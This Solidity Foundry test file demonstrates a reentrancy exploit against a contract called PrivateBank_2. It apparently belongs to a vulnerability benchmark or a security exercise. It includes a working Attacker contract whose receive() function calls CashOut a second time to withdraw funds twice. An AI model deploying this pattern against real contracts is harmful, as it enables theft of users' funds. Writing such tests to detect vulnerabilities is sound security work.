
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PrivateBank_2, Log} from "../src/PrivateBank_2.sol";

contract TestReentrancyPrivateBank_2 is Test {

    PrivateBank_2 public _contractUnderTest;
    
    Attacker public _attacker;

    function setUp() public {
        Log _transferLog = new Log();
        _contractUnderTest = new PrivateBank_2(address(_transferLog));

        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        vm.assume(attackVal >= 1 ether && attackVal <= type(uint128).max / 2);

        vm.deal(address(_contractUnderTest), attackVal * 2); 
        
        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), attackVal * 3);

        _attacker.setupAttack{value: 2 * attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    PrivateBank_2 public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;

    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = PrivateBank_2(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        _victim.Deposit{value: val * 2}();
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        storedAttackVal = val;

        _victim.CashOut(val);

        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            _victim.CashOut(storedAttackVal);
            attackCallCount++;
        }
    }
}
